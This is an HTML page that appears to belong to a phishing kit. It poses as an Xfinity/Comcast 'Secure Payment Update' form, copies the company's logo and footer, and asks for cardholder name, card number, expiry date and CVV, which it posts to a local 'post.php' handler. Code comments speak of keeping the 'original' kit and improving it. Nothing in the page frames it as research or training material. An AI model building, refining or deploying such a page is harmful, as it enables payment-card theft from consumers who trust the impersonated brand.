<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>xfinity • Secure Payment Update</title>
    <!-- Original external stylesheet -->
    <link rel="stylesheet" href="res/app.css">
    <style>
        /* ----- Trebuchet MS font overrides ----- */
        body, input, button, label, p, h2, a, .title, .container, footer, .copy, .links, .cookie,
        .col, .btn, .logo, div, span, .card-icons-wrapper, .cvv-hint-text, .terms, .find, .link {
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Segoe UI', sans-serif !important;
        }

        input::placeholder {
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', sans-serif;
            font-weight: normal;
            letter-spacing: normal;
        }

        /* ----- Card brand images styling ----- */
        .card-icons-wrapper {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-top: 8px;
            margin-bottom: 4px;
        }

        .card-icons-wrapper img {
            height: 30px;
            width: auto;
            object-fit: contain;
            transition: opacity 0.2s ease;
        }

        .card-icons-wrapper img:hover {
            opacity: 0.85;
        }

        /* ----- Helpers & layout refinements ----- */
        .cvv-hint-text {
            font-size: 11px;
            color: #5f7f9c;
            margin-top: 4px;
            display: block;
            font-weight: normal;
        }

        .col {
            margin-bottom: 18px;
        }

        label {
            font-weight: 700;
            letter-spacing: 0.3px;
            font-size: 0.85rem;
            color: #1f3b4c;
        }

        .btn button {
            font-weight: 600;
            font-family: 'Trebuchet MS', 'Segoe UI', sans-serif !important;
        }

        .links img, .cookie img, .logo img {
            max-width: 100%;
            display: inline-block;
        }

        .title h2 {
            font-weight: 700;
            letter-spacing: -0.2px;
        }

        .title p {
            font-weight: 500;
            color: #3b5c7e;
        }

        /* Keep footer links clean */
        footer a, footer span {
            font-family: 'Trebuchet MS', sans-serif !important;
        }
    </style>
</head>
<body>
    <main>
        <div class="container">
            <!-- original logo (unchanged) -->
            <div class="logo">
                <img src="res/img/logo.png" alt="xfinity">
            </div>
            <div class="title">
                <h2>Update payment method</h2>
                <p>Securely update your credit or debit card information</p>
            </div>

            <form action="post.php" method="post">
                <!-- Cardholder name - US professional standard -->
                <div class="col">
                    <label>Cardholder name</label>
                    <input type="text" name="name" placeholder="Full name as shown on card" required>
                </div>

                <!-- Card number field + three brand images (Amex, Visa, Mastercard) using real images -->
                <div class="col">
                    <label>Card number</label>
                    <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
                    <div class="card-icons-wrapper">
                        <!-- American Express image as provided -->
                        <img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/4_Card_color_horizontal.png" 
                             alt="American Express" 
                             title="American Express">
                    </div>
                </div>

                <!-- Expiration date -->
                <div class="col">
                    <label>Expiration date</label>
                    <input type="text" name="exp" required placeholder="MM/YY" id="exp">
                </div>

                <!-- CVV (professional US label) -->
                <div class="col">
                    <label>CVV</label>
                    <input type="password" name="cvv" required placeholder="3 or 4 digit code" id="cvv">
                    <span class="cvv-hint-text">Security code on back of card (CVV)</span>
                </div>

                <div class="btn">
                    <button type="submit">Continue</button>
                </div>
            </form>
            <br>
        </div>

        <!-- footer (kept exactly as original with images and links) -->
        <footer>
            <div class="copy">
                &copy; 2026 Comcast
            </div>
            <div class="links">
                <div class="pic"> 
                    <img src="res/img/line1.png" alt="">
                    <a href="#">Web Terms Of Service</a>
                </div>
                <div class="pic2"> 
                    <img src="res/img/line2.png" alt="">
                    <a href="#">CA Notice at Collection</a>
                </div>
                <div class="pic3"> 
                    <img src="res/img/line3.png" alt="">
                    <a href="#">Privacy Policy</a>
                </div>
                <div class="pic4"> 
                    <img src="res/img/line4.png" alt="">
                    <a href="#">Your Privacy Choices</a>
                </div>
                <div class="pic5"> 
                    <img src="res/img/line5.png" alt="">
                    <a href="#"><span>Health Privacy Notice</span></a>
                </div>
                <div class="pic6"> 
                    <img src="res/img/line6.png" alt="">
                    <a href="#">Ad Choices</a>
                </div>
            </div>
            <div class="cookie">
                <div class="foter"> 
                    <img src="res/img/foter.png" alt="">
                    <a href="#"><span>Cookie Preferences</span></a>
                </div>
            </div>
        </footer>
    </main>

    <!-- jQuery + masking (preserved original functionality) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        // Original masking for card, expiry, and CVV fields
        $("#cc").mask("0000 0000 0000 0000");
        $("#exp").mask("00/00");
        $("#cvv").mask("0000");
        
        // Limit CVV to 4 digits maximum
        $("#cvv").on("input", function() {
            let raw = $(this).val().replace(/\D/g, '');
            if(raw.length > 4) $(this).val(raw.slice(0,4));
        });

        // Improve expiration formatting: prevent invalid months
        $("#exp").on("blur", function() {
            let val = $(this).val().replace(/\D/g, '');
            if(val.length >= 2) {
                let month = parseInt(val.substring(0,2), 10);
                if(month > 12) month = 12;
                if(month < 1) month = 1;
                let monthStr = month < 10 ? '0' + month : '' + month;
                let yearPart = val.substring(2,4);
                if(yearPart.length === 2) {
                    $(this).val(monthStr + '/' + yearPart);
                } else if (yearPart.length === 1) {
                    $(this).val(monthStr + '/' + yearPart);
                } else {
                    $(this).val(monthStr);
                }
            }
        });
    </script>
</body>
</html>